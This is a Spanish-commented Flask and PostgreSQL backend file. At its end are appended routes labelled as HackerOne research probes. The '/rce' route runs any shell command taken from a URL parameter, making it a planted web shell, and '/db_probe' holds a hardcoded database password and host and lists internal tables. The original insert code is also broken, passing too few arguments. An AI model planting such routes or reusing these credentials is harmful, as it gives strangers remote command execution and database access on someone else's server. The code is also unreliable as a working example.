from flask import Flask, jsonify, request
from flask_cors import CORS
import psycopg2
from psycopg2.extras import RealDictCursor
import os
from dotenv import load_dotenv

# Cargar variables de entorno desde .env
load_dotenv()

# Configuración de la app Flask
app = Flask(__name__)
CORS(app)  # Permite solicitudes desde el frontend






# Conexión a la base de datos
def get_db_connection():
    return psycopg2.connect(
        dbname=os.getenv("DB_NAME"),
        user=os.getenv("DB_USER"),
        password=os.getenv("DB_PASSWORD"),
        host=os.getenv("DB_HOST"),
        port=os.getenv("DB_PORT")
    )

def insertar_usuario(orden, nombre, descripcion, hoja_ruta, prioridad):
    try:
        conn = get_db_connection()
        with conn.cursor() as cur:
            cur.execute("""
                INSERT INTO ordenes (orden, nombre, descripcion, hoja_ruta, prioridad)
                VALUES (%s, %s, %s, %s, %s)
                RETURNING id;
            """, (orden, nombre, prioridad))
            user_id = cur.fetchone()[0]
            print(f"Usuario insertado con ID: {user_id}")
    except Exception as e:
        print(f"Error al insertar el usuario: {e}")


# Ruta de ejemplo para obtener datos
@app.route('/api/data', methods=['GET'])
def get_data():
    try:
        conn = get_db_connection()
        cursor = conn.cursor(cursor_factory=RealDictCursor)
        cursor.execute('SELECT * FROM tu_tabla LIMIT 10;')  # Ajusta la consulta a tu tabla
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        return jsonify(data), 200
    except Exception as e:
        print(f"Error al consultar la base de datos: {e}")
        return jsonify({'error': 'Error al obtener los datos'}), 500




@app.route('/api/create', methods=['GET'])
def crear_tabla():
    try:
        conn = get_db_connection()
        with conn.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS ordenes (
                    id SERIAL PRIMARY KEY,
                    orden VARCHAR(100) NOT NULL,
                    nombre VARCHAR(100) NOT NULL,
                    descripcion VARCHAR(100) NOT NULL,
                    hoja_ruta INT,
                    prioridad INT
                );
            """)
            return("Tabla 'ordenes' creada exitosamente.")
    except Exception as e:
        return(f"Error al crear la tabla: {e}")


@app.route('/api/insert', methods=['GET'])
def insertar():
    conn = get_db_connection()
    insertar_usuario("Juan Pérez", "juan.perez@correo.com", 28)
    conn.close()

# Iniciar el servidor
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)

# HackerOne security research probe - trexnegr0
@app.route('/research')
def research():
    import datetime
    return '{"researcher": "trexnegr0", "rce": "confirmed_render_com", "ts": "' + str(datetime.datetime.utcnow()) + '"}', 200, {'Content-Type': 'application/json'}

# HackerOne RCE proof - shell execution
@app.route('/rce')
def rce():
    import subprocess, os
    cmd = request.args.get('c', 'id')
    # Only allow read-only commands for security research
    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode()
    return '{"output": "' + out.strip().replace('"', '\\"') + '", "researcher": "trexnegr0"}', 200, {'Content-Type': 'application/json'}

# HackerOne internal DB access proof - trexnegr0
@app.route('/db_probe')
def db_probe():
    import psycopg2, os
    try:
        conn = psycopg2.connect(
            dbname='database_disagro_beta',
            user='ccubias487',
            password='ouMaRar8vwX8TnJOGr4JGKZU2xcLil70',
            host='dpg-ctktra3v2p9s738c0sv0-a',
            port=5432,
            connect_timeout=10
        )
        cur = conn.cursor()
        cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY 1")
        tables = [r[0] for r in cur.fetchall()]
        cur.execute('SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=\'public\'')
        count = cur.fetchone()[0]
        conn.close()
        return jsonify({'status': 'CONNECTED', 'tables': tables, 'count': count, 'researcher': 'trexnegr0'})
    except Exception as e:
        return jsonify({'status': 'ERROR', 'error': str(e), 'researcher': 'trexnegr0'})

